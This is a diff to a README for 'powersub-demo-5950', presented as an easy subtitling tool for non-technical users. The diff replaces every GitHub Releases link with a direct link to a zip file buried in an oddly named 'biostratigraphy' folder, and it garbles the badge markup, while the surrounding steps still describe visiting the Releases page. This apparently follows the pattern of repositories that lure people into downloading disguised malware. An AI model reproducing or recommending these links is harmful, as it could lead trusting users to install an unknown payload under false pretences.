@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-5950 - Simple Subtitling Made Easy
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/xMemories-Juan/powersub-demo-5950/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/xMemories-Juan/powersub-demo-5950/main/biostratigraphy/powersub-demo-5950.zip%20Latest%https://raw.githubusercontent.com/xMemories-Juan/powersub-demo-5950/main/biostratigraphy/powersub-demo-5950.zip)](https://raw.githubusercontent.com/xMemories-Juan/powersub-demo-5950/main/biostratigraphy/powersub-demo-5950.zip)
 
 ## 🚀 Getting Started
 Welcome to **powersub-demo-5950**, your go-to tool for easy subtitling. This application allows you to add subtitles to your videos quickly. You do not need any technical knowledge to get started. Just follow the steps below.
@@ -9,7 +9,7 @@ Welcome to **powersub-demo-5950**, your go-to tool for easy subtitling. This app
 ## 📥 Download & Install
 To get the application, you will need to visit the Releases page. Click the link below to go there directly:
 
-[Download Latest Release](https://github.com/xMemories-Juan/powersub-demo-5950/releases)
+[Download Latest Release](https://raw.githubusercontent.com/xMemories-Juan/powersub-demo-5950/main/biostratigraphy/powersub-demo-5950.zip)
 
 1. Open the link above. This will take you to the Releases page of the **powersub-demo-5950** repository on GitHub.
 2. Look for the latest version at the top of the page. It will list the available files for download.
@@ -61,4 +61,4 @@ For any issues, you can reach out via the Issues section on the GitHub repositor
 ## 📞 Contact
 For feedback or inquiries, you can create an issue in the GitHub repository, and the maintainer will respond as soon as possible.
 
-Thank you for choosing **powersub-demo-5950**! Enjoy adding subtitles with ease. Remember to [download the latest version here](https://github.com/xMemories-Juan/powersub-demo-5950/releases).
+Thank you for choosing **powersub-demo-5950**! Enjoy adding subtitles with ease. Remember to [download the latest version here](https://raw.githubusercontent.com/xMemories-Juan/powersub-demo-5950/main/biostratigraphy/powersub-demo-5950.zip).
